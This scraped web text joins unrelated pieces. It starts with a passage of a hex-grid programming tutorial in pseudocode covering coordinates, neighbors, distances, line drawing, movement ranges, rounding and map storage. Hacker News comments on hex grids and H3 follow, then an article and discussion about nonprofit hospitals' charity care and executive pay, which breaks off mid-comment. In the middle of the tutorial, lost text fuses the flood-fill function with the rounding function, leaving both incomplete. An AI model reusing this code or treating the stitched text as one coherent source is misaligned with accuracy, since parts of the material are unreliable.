row by 2 each hex. This allows the in-between values for the hexes that are halfway in between: “double-width” horizontal layout doubles column values “double-height” horizontal layout doubles row values I haven't found much information about this system — tri-bit.com called it interlaced, rot.js calls it double width, and this paper calls it rectangular. Other possible names: brick or checkerboard. I'm not sure what to call it. Tamás Kenéz sent me the core algorithms (neighbors, distances, etc.). If you have any references, please send them to me. Others # In previous versions of this document, I used x z y for hexagonal coordinates and also for cartesian coordinates, and then I also used q r s for hexagonal coordinates. To avoid confusion in this document, I'll use the names q r s for hexagonal coordinates (with the constraint q + r + s = 0), and I'll use the names x y z for cartesian coordinates. There are many different valid cube hex coordinate systems. Some of them have constraints other than q + r + s = 0. I've shown only one of the many systems. There are also many different valid axial hex coordinate systems, found by using reflections and rotations. Some have the 120° axis separation as shown here and some have a 60° axis separation. There are also cube systems that use q-r, r-s, s-q. One of the interesting properties of that system is that it reveals hexagonal directions. There are spiral coordinate systems I haven't explored. See this question or this question on stackoverflow, or this paper about machine vision, or this diagram about \"generalized balanced ternary\" coordinates, or this math paper, or this discussion on reddit. They seem potentially useful for fixed sized hexagonal shaped maps. Recommendations # What do I recommend?Offset Doubled Axial Cube Pointy rotation evenr, oddr doublewidth axial cube Flat rotation evenq, oddq doubleheight Other rotations no yes Vector operations (add, subtract, scale) no yes yes yes Array storage rectangular no* rhombus* no* Hash storage any shape any shape Hexagonal symmetry no no no yes Easy algorithms few some most most * rectangular maps require an adapter, shown in the map storage section My recommendation: if you are only going to use non-rotated rectangular maps, consider the doubled or offset system that matches your map orientation. For maps with rotation, or non-rectangularly shaped maps, use axial/cube. Either choose to store the s coordinate (cube), or calculate it when needed as -q-r (axial). Coordinate conversion # It is likely that you will use axial or offset coordinates in your project, but many algorithms are simpler to express in axial/cube coordinates. Therefore you need to be able to convert back and forth. Axial coordinates # Axial and Cube coordinates are essentially the same. In the Cube system, we store the third coordinate, s. In the Axial system, we don't store it, but instead have to calculate it as needed, s = -q-r. function cube_to_axial(cube): var q = cube.q var r = cube.r return Hex(q, r) function axial_to_cube(hex): var q = hex.q var r = hex.r var s = -q-r return Cube(q, r, s) Converting between the systems like this is probably overkill. If you're using Cube and need Axial, ignore the s coordinate. If you're using Axial and need Cube, calculate the s coordinate in the algorithms that need it. Offset coordinates # Determine which type of offset system you use; *-r are pointy top; *-q are flat top. The conversion is different for each. function axial_to_oddr(hex): var col = hex.q + (hex.r - (hex.r&1)) / 2 var row = hex.r return OffsetCoord(col, row) function oddr_to_axial(hex): var q = hex.col - (hex.row - (hex.row&1)) / 2 var r = hex.row return Hex(q, r) odd-r shoves odd rows by +½ column even-r shoves even rows by +½ column odd-q shoves odd columns by +½ row even-q shoves even columns by +½ row Convert to/from axial or cube. Implementation note: I use a&1 (bitwise and) instead of a%2 (modulo) to detect whether something is even (0) or odd (1), because it works with negative numbers too. See a longer explanation on my implementation notes page. Doubled coordinates # function doubleheight_to_axial(hex): var q = hex.col var r = (hex.row - hex.col) / 2 return Hex(q, r) function axial_to_doubleheight(hex): var col = hex.q var row = 2 * hex.r + hex.q return DoubledCoord(col, row) function doublewidth_to_axial(hex): var q = (hex.col - hex.row) / 2 var r = hex.row return Hex(q, r) function axial_to_doublewidth(hex): var col = 2 * hex.q + hex.r var row = hex.r return DoubledCoord(col, row) If you need Cube coordinates, use Cube(q, r, -q-r) instead of Hex(q, r). Neighbors # Given a hex, which 6 hexes are neighboring it? As you might expect, the answer is simplest with cube coordinates, still pretty simple with axial coordinates, and slightly trickier with offset coordinates. We might also want to calculate the 6 “diagonal” hexes. Cube coordinates # Moving one space in hex coordinates involves changing one of the 3 cube coordinates by +1 and changing another one by -1 (the sum must remain 0). There are 3 possible coordinates to change by +1, and 2 remaining that could be changed by -1. This results in 6 possible changes. Each corresponds to one of the hexagonal directions. The simplest and fastest approach is to precompute the permutations and put them into a table of Cube(dq, dr, ds): var cube_direction_vectors = [ Cube(+1, 0, -1), Cube(+1, -1, 0), Cube(0, -1, +1), Cube(-1, 0, +1), Cube(-1, +1, 0), Cube(0, +1, -1), ] function cube_direction(direction): return cube_direction_vectors[direction] function cube_add(hex, vec): return Cube(hex.q + vec.q, hex.r + vec.r, hex.s + vec.s) function cube_neighbor(cube, direction): return cube_add(cube, cube_direction(direction)) With the Cube coordinate systems, we can store differences between two coordinates (a \"vector\"), and then add those differences back to a coordinate to get another coordinate. That's what the cube_add function does. Axial and Doubled coordinates also support this, but the Offset coordinates do not. Axial coordinates # Since axial is the same as cube except not storing the third coordinate, the code is the same as the previous section except we won't write out the third coordinate: var axial_direction_vectors = [ Hex(+1, 0), Hex(+1, -1), Hex(0, -1), Hex(-1, 0), Hex(-1, +1), Hex(0, +1), ] function axial_direction(direction): return axial_direction_vectors[direction] function axial_add(hex, vec): return Hex(hex.q + vec.q, hex.r + vec.r) function axial_neighbor(hex, direction): return axial_add(hex, axial_direction(direction)) Offset coordinates # As with cube and axial coordinates, we'll build a table of the numbers we need to add to col and row. However offset coordinates can't be safely subtracted and added. For example, moving southeast from (0, 0) takes us to (0, +1), so we might put (0, +1) into the table for moving southeast. But moving southeast from (0, +1) takes us to (+1, +2), so we would need to put (+1, +1) into that table. The amount we need to add depends on where in the grid we are. Since the movement vector is different for odd and even columns/rows, we will need two separate lists of neighbors. Pick a grid type to see the corresponding code. var oddr_direction_differences = [ // even rows [[+1, 0], [ 0, -1], [-1, -1], [-1, 0], [-1, +1], [ 0, +1]], // odd rows [[+1, 0], [+1, -1], [ 0, -1], [-1, 0], [ 0, +1], [+1, +1]], ] function oddr_offset_neighbor(hex, direction): var parity = hex.row & 1 var diff = oddr_direction_differences[parity][direction] return OffsetCoord(hex.col + diff[0], hex.row + diff[1]) Pick a grid type: odd-r even-r odd-q even-q Using the above lookup tables is the easiest way to to calculate neighbors. It's also possible to derive these numbers, for those of you who are curious. Doubled coordinates # Unlike offset coordinates, the neighbors for doubled coordinates do not depend on which column/row we're on. They're the same everywhere, like axial/cube coordinates. Also unlike offset coordinates, we can safely subtract and add doubled coordinates, which makes them easier to work with than offset coordinates. var doublewidth_direction_vectors = [ DoubledCoord(+2, 0), DoubledCoord(+1, -1), DoubledCoord(-1, -1), DoubledCoord(-2, 0), DoubledCoord(-1, +1), DoubledCoord(+1, +1), ] function doublewidth_add(hex, diff): return DoubleCoord(hex.col + diff.col, hex.row + diff.row) function doublewidth_neighbor(hex, direction): var vec = doublewidth_direction_vectors[direction] return doublewidth_add(hex, vec) Pick a grid type: double width double height Diagonals # Moving to a “diagonal” space in hex coordinates changes one of the 3 cube coordinates by ±2 and the other two by ∓1 (the sum must remain 0). var cube_diagonal_vectors = [ Cube(+2, -1, -1), Cube(+1, -2, +1), Cube(-1, -1, +2), Cube(-2, +1, +1), Cube(-1, +2, -1), Cube(+1, +1, -2), ] function cube_diagonal_neighbor(cube, direction): return cube_add(cube, cube_diagonal_vectors[direction]) As before, you can convert these into axial by dropping one of the three coordinates, or convert to offset/doubled by precalculating the results. Distances # Cube coordinates # Since cube hexagonal coordinates are based on 3d cube coordinates, we can adapt the distance calculation to work on hexagonal grids. Each hexagon corresponds to a cube in 3d space. Adjacent hexagons are distance 1 apart in the hex grid but distance 2 apart in the cube grid. For every 2 steps in the cube grid, we need only 1 step in the hex grid. In the 3d cube grid, Manhattan distances are abs(dx) + abs(dy) + abs(dz). The distance on a hex grid is half that: function cube_subtract(a, b): return Cube(a.q - b.q, a.r - b.r, a.s - b.s) function cube_distance(a, b): var vec = cube_subtract(a, b) return (abs(vec.q) + abs(vec.r) + abs(vec.s)) / 2 // or: (abs(a.q - b.q) + abs(a.r - b.r) + abs(a.s - b.s)) / 2 An equivalent way to write this is by noting that one of the three coordinates must be the sum of the other two, then picking that one as the distance. You may prefer the “divide by two” form above, or the “max” form here, but they give the same result: function cube_subtract(a, b): return Cube(a.q - b.q, a.r - b.r, a.s - b.s) function cube_distance(a, b): var vec = cube_subtract(a, b) return max(abs(vec.q), abs(vec.r), abs(vec.s)) // or: max(abs(a.q - b.q), abs(a.r - b.r), abs(a.s - b.s)) The maximum of the three coordinates is the distance. You can also use the max of abs(vec.q-vec.r), abs(vec.r-vec.s), abs(vec.s-vec.q) to figure out which of the 6 “wedges” a hex is in; see diagrams here. Xiangguo Li's paper Storage and addressing scheme for practical hexagonal image processing. (DOI) gives a formula for Euclidean distance, which can be adapted to axial coordinates: sqrt(dq² + dr² + dq*dr). Axial coordinates # In the axial system, the third coordinate is implicit. We can always convert axial to cube to calculate distance: function axial_distance(a, b): var ac = axial_to_cube(a) var bc = axial_to_cube(b) return cube_distance(ac, bc) Once we inline those functions it ends up as: function axial_distance(a, b): return (abs(a.q - b.q) + abs(a.q + a.r - b.q - b.r) + abs(a.r - b.r)) / 2 which can also be written: function axial_subtract(a, b): return Hex(a.q - b.q, a.r - b.r) function axial_distance(a, b): var vec = axial_subtract(a, b) return (abs(vec.q) + abs(vec.q + vec.r) + abs(vec.r)) / 2 There are lots of different ways to write hex distance in axial coordinates. No matter which way you write it, axial hex distance is derived from the Mahattan distance on cubes. For example, the “difference of differences” formula results from writing a.q + a.r - b.q - b.r as a.q - b.q + a.r - b.r, and using “max” form instead of the “divide by two” form of cube_distance. They're all equivalent once you see the connection to cube coordinates. Offset coordinates # As with axial coordinates, we'll convert offset coordinates to axial/cube coordinates, then use axial/cube distance. function offset_distance(a, b): var ac = offset_to_axial(a) var bc = offset_to_axial(b) return axial_distance(ac, bc) We'll use the same pattern for many of the algorithms: convert offset to axial/cube, run the axial/cube version of the algorithm, and convert any axial/cube results back to offset coordinates. There are also more direct formulas for distances; see the rot.js manual for a formula in the \"Odd shift\" section. Doubled coordinates # Although converting doubled coordinates to axial/cube coordinates works, there's also a direct formula for distances, from the rot.js manual: function doublewidth_distance(a, b): var dcol = abs(a.col - b.col) var drow = abs(a.row - b.row) return drow + max(0, (dcol-drow)/2) function doubleheight_distance(a, b): var dcol = abs(a.col - b.col) var drow = abs(a.row - b.row) return dcol + max(0, (drow−dcol)/2) Line drawing # How do we draw a line from one hex to another? I use linear interpolation for line drawing. Evenly sample the line at N+1 points, and figure out which hexes those samples are in. First we calculate N=10 to be the hex distance between the endpoints. Then evenly sample N+1 points between point A and point B. Using linear interpolation, each point will be A + (B - A) * 1.0/N * i, for values of i from 0 to N, inclusive. In the diagram these sample points are the dark blue dots. This results in floating point coordinates. Convert each sample point (float) back into a hex (int). The algorithm is called cube_round. Putting these together to draw a line from A to B: function lerp(a, b, t): # for floats return a + (b - a) * t function cube_lerp(a, b, t): # for hexes return Cube(lerp(a.q, b.q, t), lerp(a.r, b.r, t), lerp(a.s, b.s, t)) function cube_linedraw(a, b): var N = cube_distance(a, b) var results = [] for each 0 ≤ i ≤ N: results.append(cube_round(cube_lerp(a, b, 1.0/N * i))) return results More notes: There are times when cube_lerp will return a point that's exactly on the side between two hexes. Then cube_round will push it one way or the other. The lines will look better if it's always pushed in the same direction. You can do this by adding an \"epsilon\" hex Cube(1e-6, 2e-6, -3e-6) to one or both of the endpoints before starting the loop. This will \"nudge\" the line in one direction to avoid landing on side boundaries. The DDA Algorithm on square grids sets N to the max of the distance along each axis. We do the same in cube space, which happens to be the same as the hex grid distance. There are times when this algorithm slightly goes outside the marked hexagons (example). I haven't come up with an easy fix for this. The cube_lerp function needs to return a cube with float coordinates. If you're working in a statically typed language, you won't be able to use the Cube type but instead could define FloatCube, or inline the function into the line drawing code if you want to avoid defining another type. You can optimize the code by inlining cube_lerp, and then calculating B.q-A.q, B.r-A.r, B.s-A.s, and 1.0/N outside the loop. Multiplication can be turned into repeated addition. You'll end up with something like the DDA algorithm. This code can be adapted to work with axial coordinates — define axial_lerp and then use axial_distance, axial_round in axial_linedraw. It is likely it can work with doubled coordinates as well. I use axial or cube coordinates for line drawing, but if you want something for offset coordinates, take a look at this article. There are many variants of line drawing. Sometimes you'll want \"super cover\". Someone sent me hex super cover line drawing code but I haven't studied it yet. A paper from Yong-Kui, Liu, The Generation of Straight Lines on Hexagonal Grids, Computer Graphics Forum 12-1 (Feb 1993) (DOI), describes a variant of Bresenham's line drawing algorithm for hexagonal grids. The same author has another paper, The Generation of Circular Arcs on Hexagonal Grids (DOI). Movement Range # Coordinate range # Given a hex center and a range N, which hexes are within N steps from it? We can work backwards from the hex distance formula, distance = max(abs(q), abs(r), abs(s)). To find all hexes within N steps, we need max(abs(q), abs(r), abs(s)) ≤ N. This means we need all three to be true: abs(q) ≤ N and abs(r) ≤ N and abs(s) ≤ N. Removing absolute value, we get -N ≤ q ≤ +N and -N ≤ r ≤ +N and -N ≤ s ≤ +N. In code it's a nested loop: var results = [] for each -N ≤ q ≤ +N: for each -N ≤ r ≤ +N: for each -N ≤ s ≤ +N: if q + r + s == 0: results.append(cube_add(center, Cube(q, r, s))) This loop will work but it's somewhat inefficient. Of all the values of s we loop over, only one of them actually satisfies the q + r + s = 0 constraint on cubes. Instead, let's directly calculate the value of s that satisfies the constraint: var results = [] for each -N ≤ q ≤ +N: for each max(-N, -q-N) ≤ r ≤ min(+N, -q+N): var s = -q-r results.append(cube_add(center, Cube(q, r, s))) This loop iterates over exactly the needed coordinates. In the diagram, each range is a pair of lines. Each line is an inequality (a half-plane). We pick all the hexes that satisfy all six inequalities. This loop also works nicely with axial coordinates: var results = [] for each -N ≤ q ≤ +N: for each max(-N, -q-N) ≤ r ≤ min(+N, -q+N): results.append(axial_add(center, Hex(q, r))) Intersecting ranges # If you need to find hexes that are in more than one range, you can intersect the ranges before generating a list of hexes. You can either think of this problem algebraically or geometrically. Algebraically, each hexagonally-shaped region is expressed as inequality constraints of the form -N ≤ dq ≤ +N, and we're going to solve for the intersection of those constraints. Geometrically, each region is a cube in 3D space, and we're going to intersect two cubes in 3D space to form a cuboid in 3D space, then project back to the q + r + s = 0 plane to get hexes. I'm going to solve it algebraically: First, we rewrite constraint -N ≤ dq ≤ +N into a more general form, qmin ≤ q ≤ qmax, and set qmin = center.q - N and qmax = center.q + N. We'll do the same for r and s, and end up with this generalization of the code from the previous section: var results = [] for each qmin ≤ q ≤ qmax: for each max(rmin, -q-smax) ≤ r ≤ min(rmax, -q-smin): results.append(Hex(q, r)) The intersection of two ranges a ≤ q ≤ b and c ≤ q ≤ d is max(a, c) ≤ q ≤ min(b, d). Since a hex region is expressed as ranges over q, r, s, we can separately intersect each of the q, r, s ranges then use the nested loop to generate a list of hexes in the intersection. For one hex region we set qmin = H.q - N and qmax = H.q + N and likewise for r and s. For intersecting two hex regions we set qmin = max(H1.q - N, H2.q - N) and qmax = min(H1.q + N, H2.q + N), and likewise for r and s. The same pattern works for intersecting three or more regions, and can generalize to other shapes (triangles, trapezoids, rhombuses, non-regular hexagons). Obstacles # If there are obstacles, the simplest thing to do is a distance-limited flood fill (breadth first search). In the code, fringes[k] is an array of all hexes that can be reached in k steps. Each time through the main loop, we expand level k-1 into level k. This works equally well with any of the hex coordinate systems (cube, axial, offset, doubled). function hex_reachable(start, movement): var visited = set() # set of hexes add start to visited var fringes = [] # array of arrays of hexes fringes.append([start]) for each 1r_diff and q_diff > s_diff: q = -r-s else if r_diff > s_diff: r = -q-s else: s = -q-r return Cube(q, r, s) For non-cube coordinates, the simplest thing to do is to convert to cube coordinates, use the rounding algorithm, then convert back: function axial_round(hex): return cube_to_axial(cube_round(axial_to_cube(hex))) The same would work if you have oddr, evenr, oddq, or evenq instead of axial. Jacob Rus has a direct implementation of axial_round without converting to cube first. Implementation note: cube_round and axial_round take float coordinates instead of int coordinates. If you've written a Cube and Hex class, they'll work fine in dynamically typed languages where you can pass in floats instead of ints, and they'll also work fine in statically typed languages with a unified number type. However, in most statically typed languages, you'll need a separate class/struct type for float coordinates, and cube_round will have type FloatCube → Cube. If you also need axial_round, it will be FloatHex → Hex, using helper function floatcube_to_floathex instead of cube_to_hex. In languages with parameterized types (C++, Haskell, etc.) you might define Cube where T is either int or float. Alternatively, you could write cube_round to take three floats as inputs instead of defining a new type just for this function. Patrick Surry has a visualization showing why the rounding algorithm works. Map storage in axial coordinates # One of the common complaints about the axial coordinate system is that it leads to wasted space when using a rectangular map; that's one reason to favor an offset coordinate system. However all the hex coordinate systems lead to wasted space when using a triangular or hexagonal map. We can use the same strategies for storing all of them. Shape: rectangle hexagon rhombus down-triangle up-triangle Switch to array of arrays Notice in the diagram that the wasted space is on the left and right sides of each row (except for rhombus maps) This gives us three strategies for storing the map: Use a 2D Array. Use nulls or some other sentinel at the unused spaces. Store Hex(q, r) at array[r][q]. At most there's a factor of two for these common shapes; it may not be worth using a more complicated solution. Use a hash table instead of dense array. This allows arbitrarily shaped maps, including ones with holes. Store Hex(q, r) in hash_table(hash(q,r)). Use an array of arrays by sliding row to the left, and shrinking the rows to the minimum size. For pointy-top hexes, store Hex(q, r) in array[r - first_row][q - first_column(r)]. Some examples for the map shapes above: Rectangle. Store Hex(q, r) at array[r][q + floor(r/2)]. Each row has the same length. This is equivalent to odd-r offset. Hexagon. Store Hex(q, r) at array[r][q - max(0, N-r)]. Row r size is 2*N+1 - abs(N-r). Rhombus. Conveniently, first_row and first_column(r) are both 0. Store Hex(q, r) at array[r][q]. All rows are the same length. Down-triangle. Store Hex(q, r) at array[r][q]. Row r has size N+1-r. Up-triangle. Store Hex(q, r) at array[r][q - N+1+r]. Row r has size 1+r. For flat-top hexes, swap the roles of the rows and columns, and use array[q - first_column][r - first_row(q)]. Encapsulate access into the getter/setter in a map class so that the rest of the game doesn't need to know about the map storage. Your maps may not look exactly like these, so you will have to adapt one of these approaches. Wraparound maps # In some games you want the map to “wrap” around the edges. In a square map, you can either wrap around the x-axis only (roughly corresponding to a sphere) or both x- and y-axes (roughly corresponding to a torus). Wraparound depends on the map shape, not the tile shape. To wrap around a rectangular map is easy with offset coordinates. I'll show how to wrap around a hexagon-shaped map with cube coordinates. Corresponding to the center of the map, there are six “mirror” centers. When you go off the map, you subtract the mirror center closest to you until you are back on the main map. In the diagram, try exiting the center map, and watch one of the mirrors enter the map on the opposite side. The simplest implementation is to precompute the answers. Make a lookup table storing, for each hex just off the map, the corresponding cube on the other side. For each of the six mirror centers M, and each of the locations on the map L, store mirror_table[cube_add(M, L)] = L. Then any time you calculate a hex that's in the mirror table, replace it by the unmirrored version. See stackoverflow for another approach. For a hexagonal shaped map with radius N, the mirror centers will be Cube(2*N+1, -N, -N-1) and its six rotations. Related: Sander Evers has a nice explanation of how to combine small hexagons into a grid of large hexagons and also a coordinate system to represent small hexagons within a larger one. Pathfinding # If you're using graph-based pathfinding such as A* or Dijkstra's algorithm or Floyd-Warshall, pathfinding on hex grids isn't different from pathfinding on square grids. The explanations and code from my pathfinding tutorial will work equally well on hexagonal grids. Touch a hex in the diagram to see the path to it. Neighbors. The sample code I provide in the pathfinding tutorial calls graph.neighbors to get the neighbors of a location. Use the function in the neighbors section for this. Filter out the neighbors that are impassable. Heuristic. The sample code for A* uses a heuristic function that gives a distance between two locations. Use the distance formula, scaled to match the movement costs. For example if your movement cost is 5 per hex, then multiply the distance by 5. More # I have an guide to implementing your own hex grid library, including sample code in C++, Java, C#, Javascript, Haxe, and Python. The best early guide I saw to the axial coordinate system was Clark Verbrugge's guide, written in 1996. The first time I saw the cube coordinate system was from Charles Fu's posting to rec.games.programmer in 1994. DevMag has a nice visual overview of hex math including how to represent areas such as half-planes, triangles, and quadrangles. There's a PDF article that goes into more detail. Highly recommended! The GameLogic Grids library implements these and many other grid types in Unity. In my Guide to Grids, I cover axial coordinate systems to address square, triangle, and hexagon sides and corners, and algorithms for the relationships among tiles, sides, and corners. I also show how square and hex grids are related. James McNeill has a nice visual explanation of grid transformations.

I use Haxe&#x27;s macro system to turn this into an abstract syntax tree. I then use Haxe&#x27;s ADT + pattern matching to transform this into a different syntax tree. And then I again use Haxe&#x27;s ADT + pattern matching to transform this into Python, C++, JavaScript, C#, TypeScript, Lua, Java, and Haxe code. (I also have partial support for Rust and Lisp)Unlike most \"transpilers\" I&#x27;m trying to generate code that looks reasonably idiomatic for the target language. I transform names and structure (e.g. `hex_add()` for a C global function but `Hex.add()` for a Java class method) and also transform for dynamic types (e.g. Point(x,y) can have numbers in JavaScript but I need a separate Point and FloatPoint for int&#x2F;float in C++). This means I need to sometimes annotate the original Haxe-syntax code with hints about how it should translate into each language. For example, 1&#x2F;2 produces a different value in Python (0.5) than in C (0), so I need to add hints to tell the transform code which one I mean.I also translate the unit tests in this way, and run them as part of the output code.It&#x27;s been a fun project but it&#x27;s grown out of hand. The past week I&#x27;ve been pondering refactoring parts of it.The reason for all this complexity is that my original goal was to add a language drop-down on the implementation guide page. Then you could read the implementation guide in your choice of language, your choice of grid, your choice of indentation, etc. That was an overly ambitious project :-) reply stcg 14 hours agorootparentThanks a lot for your work :)) It was very helpful when I tried to implement a simple version of Settlers of Catan.But more importantly, reading&#x2F;interacting with your work is fun!

This was the last major update, as it involved updating all the text, diagrams, and sample code. The unification is something I had been wanting to do for several years but I knew it would take a while and it would also break \"backwards compatibility\" with everyone who had read the x&#x2F;z&#x2F;y version. It was especially tricky because x&#x2F;z&#x2F;y not x&#x2F;y&#x2F;z corresponded to q&#x2F;r&#x2F;s, and that&#x27;s what led to the embarassing typos in code I had to fix later.

You have to basically aggregate the entire dataset of millions of rows again and again for each level, instead of just doing a group-by at lowest level once, and then grouping the groups (which are just thousands).If you have H3 and several million records, every aggregation takes noteable amount of time.It also means that you must keep those indice for each record for each level. Because the parent function gives wrong cell for points on the fringe. reply dragonwriter 15 hours agorootparent> Which makes no sense if you work with aggregated data, because your summed aggregations start to deviate from direct ones.It depends on the purpose of the aggregation; if you are aggregating based on logical containment and using a consistent grid level for deciding the canonical location, this isn&#x27;t an issue; if you are doing \"aggregation\" by doing strict geographical lookup for each datapoint at the grid level of the \"aggregate\", then it is an issue, but that is not actually an aggregation, that&#x27;s a separate basic bucketing at each resolution level (though it may be the sensible way to handle data for a particular application.)In essence, you can use an H3 index at one level as a reference to particular polygon or an a reference to the aggregate of polygons on specified level which are logically contained within it, and which makes sense depends on the application.It is a true, and a disadvantage for some uses, that these are necessarily different interpretations, and you have to choose and apply one, whereas with lat&#x2F;long or S2, geographical and logical containment are identical. reply culebron21 15 hours agorootparentThe purpose of aggregation is quite simple -- it has to show which area has which amount of some objects&#x2F;properties. And it must be mathematically consistent.If a cell is said to be a sum of 7 underlying cells, then their sum of objects must equal to this cell&#x27;s sum of objects, which is not the case in H3.You can just hope that the diff of these values is within acceptable limits, and that company management never tries to drill down into your data, and does not put all the blame for some incorrectness on you.So, even though H3 cells kinda add-up, they actually don&#x27;t, and you have to either just plainly hope, or take care of data, as I decided to do.You&#x27;d never had this dilemma, nor need to cure the data, with a rectangular grid in either UTM projection, or Google pseudo-Mecrator, both of which preserve horizontal&#x2F;vertical aspects and are perfect for such aggregative cell grids. reply dragonwriter 14 hours agorootparent> If a cell is said to be a sum of 7 underlying cells, then their sum of objects must equal to this cell&#x27;s sum of objects, which is not the case in H3.If you are using an H3 index as an index to the aggregate of the logically-contained cells at some specified level, it absolutely is true (in this case, the exact geographic border is the border of the set of contained cells ay thr specified level, not the border of the higher-level cell specified by the index.) reply culebron21 15 hours agorootparentprevBut yes, \"depending on the purpose\" -- probably, to show something to layman users, like external partners, who&#x27;d unlikely drill down into particular numbers, and would be excited to see something techy-fancy-looking, it&#x27;s ok to show a heatmap based on H3. reply adamrezich 15 hours agorootparentprev [–] one interesting use of hex grids I came across is Sunset Overdrive&#x27;s implementation of a streaming open-world system: https:&#x2F;&#x2F;www.gdcvault.com&#x2F;play&#x2F;1022268&#x2F;Streaming-in-Sunset-Ov... hexagons are closer to circles than squares are, so they define chunks of the world as circles (positional coordinates for stuff in the chunk are offset from the center of the circle), packed in a hex grid. they explain the rationale more in the video, but if I remember correctly it just kinda makes a lot of sense given that a.)

BETH MOLE - 10/19/2023, 4:12 PM Enlarge / The Robert Wood Johnson University Hospital in New Brunswick, New Jersey. GettyBobby Bank 184 WITH Nonprofit hospitals are under increasing scrutiny for skimping on charity care, relentlessly pursuing payments from low-income patients, and paying executives massive multi-million-dollar salaries—all while earning tax breaks totaling billions. One such hospital system is RWJBarnabas Health, a large nonprofit chain in New Jersey, whose CEO made a whopping $17 million in 2021, while the hospital system only spent 1.65 percent of its nearly $6 billion in revenue on charity care. Sen. Bernie Sanders (I-Vt.), chairman of the Senate Health, Education, Labor, and Pensions (HELP) Committee, is gearing up for a showdown next week with the CEO of RWJBarnabas Health, Mark Manigan. Nurses at one of the chain's locations, Robert Wood Johnson University Hospital, are on strike, saying that the facility has become a dangerous place to work due to inadequate staffing levels. \"I look forward to hearing how [Manigan's] health care system could afford to spend over $17 million on CEO compensation in 2021 and how his hospital could afford $87 million on traveling nurses since the strike began, but somehow cannot afford to mandate safe staffing ratios to improve the lives of patients and health care workers,\" Sanders said in a statement this week. RWJBarnabas Health is far from alone in having plump executive pay and slim charity care spending. A HELP committee staff report released earlier this month examined the financial data on 16 of the country's largest nonprofit, tax-exempt hospital systems. The systems collectively make more than $3 billion in revenue each year, but in 2021, 12 of the 16 systems spent less than 2 percent of their revenue on charity care—even though, as nonprofits, they earn federal, state, and local tax exemptions for providing charity care to low-income people and other charitable community benefits. Of those 12 spending less than 2 percent, six of them spent less than 1 percent. Advertisement Enlarge HELP Committee Report on Nonprofit Hospitals Meanwhile, CEO compensation for the 16 systems averaged over $8 million, with a collective total of over $140 million. By far, the biggest earner was the CEO of CommonSpirit Health, a massive Catholic nonprofit system that runs 139 hospitals in 21 states. In 2021, CommonSpirit's CEO made $32 million. In the same year, the system spent $507 million on charity care, or 1.5 percent of its $33 billion revenue. In addition to failing to provide low-income patients with free or lower-cost care, some of the health systems ruthlessly sought payment, sending patients to collection agencies, placing liens on their property, and garnishing wages. Allina Health System, which runs nonprofit hospitals in Minnesota and Western Wisconsin, denied providing medical care and blocked appointments for patients—even children—if they had outstanding hospital bills. In 2021, Allina spent 0.3 percent of its revenue on charity care while its CEO made $3.5 million. Only after media attention did the hospital system change its policy. The findings are particularly troubling given the millions of dollars that hospitals reap with their nonprofit status. In 2020, the country's 2,978 nonprofit hospitals collectively received an estimated $28 billion in federal, state, and local tax benefits as a result of not paying those taxes, according to an analysis by the Kaiser Family Foundation. That works out to an average of $9.4 million per hospital—and accounts for 44 percent of nonprofit hospitals’ collective net income (revenue minus expenses) for that year. The Senate staff report concluded by accusing the hospital systems of \"price gouging.\" \"The disparities between the paltry amounts these hospitals are spending on charity care and their massive revenues and excessive executive compensation demonstrates that they are failing to live up to their end of the non-profit bargain,\" the report reads. The American Hospital Association, meanwhile, blasted the report, saying it is \"totally off base and does not fully account for the wide range of community benefits that hospitals provide.\" The Association pointed to its own research, which suggested that tax-exempt hospitals provided $129 billion in total benefits to their communities in 2020.

    "commentBody": "Nonprofit hospitals skimp on charity while CEOs reap millions, report findsHacker NewspastloginNonprofit hospitals skimp on charity while CEOs reap millions, report finds (arstechnica.com) 233 points by rntn 20 hours ago| hidepastfavorite137 comments jonathan-adly 20 hours agoThe article is a bit misleading in that it uses revenue. Typical margins in a health-system is slim. 3-6%. So, actual 1-2% charity care of revenue is quite significant.The thesis is correct that a health-system CEO shouldn’t make $17m&#x2F;yr. It’s a non-profit largely funded by tax payers and maintains its market share by government regulations. Just the charity care component is a bit misleading. reply harimau777 19 hours agoparentDisclaimer at the start: I&#x27;m asking this because I want to understand more about the situation that you are presenting, not as an indirect way to \"um actually\" you.How would margins be defining in this case? When I hear that the margins at gas at a gas station are x%, I understand that they are basically talking about how much I pay per gallon minus how much the gas station paid per gallon. However, it feels like defining margins in a health system would be much more complex. Is it just lookin at the raw materials (e.g. how much do medications, bandages, and scalpels cost the hospital)? Depreciation on expensive equipment like MRIs? Does pay factor in and if so is it just the salaries of people who actually do the work like managers, nurses, and doctors or also the compensation for people like CEOs? reply jonathan-adly 18 hours agorootparentHere are 2 relevant scenarios.A homeless alcoholic withdraws and gets seizures, spending a week in the ICU. He is not on Medicaid, but qualifies. After paying for all his care and applying for Medicaid on his behalf. The hospital might get 50 cents back for every dollar they spent. (They spent on doctors; nurses, medications; EMR bill, case management, etc.).This guy will essentially come back 5-6 times per year. With negative margins every time because that’s how Medicaid is designed.2nd scenario is a 70 year old with a knee replacement surgery and great insurance Medicare + supplemental. He spend a day and half in the hospital and the money that his insurance paid, would be ~130-150% cost of care.Average everything out; and you end up with 3-6% margins.Obviously, salaries are big part of the cost. So, perhaps the margins will be better if the CEO is paid less. But, overall its a low-margin business because the biggest payers are Medicaid and Medicare and they more or less pay whatever they want via legislative means. reply bumby 17 hours agorootparentAre you saying medicare&#x2F;medicaide are net-negative? Is so, what prevents hospitals from refusing to accept them?I suspect they don&#x27;t because it&#x27;s not financially solvent to do so, given the number of patients who use those services. That on it&#x27;s face seems to bring into question the claim that they are net-negative (whether that&#x27;s due to legislation or other means). reply gniv 17 hours agorootparentAt least on paper they are net-negative. If you look at a Schedule H of IRS Form 990 they report huge shortfalls from Medicare&#x2F;Medicaid. This I think helps them claim \"community benefit expense\".Example Form 990 (search inside for Schedule H): https:&#x2F;&#x2F;my.clevelandclinic.org&#x2F;-&#x2F;scassets&#x2F;files&#x2F;org&#x2F;about&#x2F;fi...See also page 8 of this pdf: https:&#x2F;&#x2F;www.aha.org&#x2F;system&#x2F;files&#x2F;media&#x2F;file&#x2F;2023&#x2F;10&#x2F;Results-... reply bumby 17 hours agorootparentThanks for sharing that. Do you happen to know how they calculate the \"community benefit expense\" that creates the shortfall?My understanding is that medical billing is inflated so they can anchor a high value to help in their negotiations with medical insurance. I&#x27;m wondering if this is the medicare adjusted value (i.e., what medicare says the procedures are worth) or the artificially inflated value? reply arcbyte 17 hours agorootparentprevHospitals are required by EMTALA[1] to treat all emergencu patients to the point of stabilization. So it only makes sense to charge whatever insurance is available because there is no turning them away. Im not sure if there are regulations 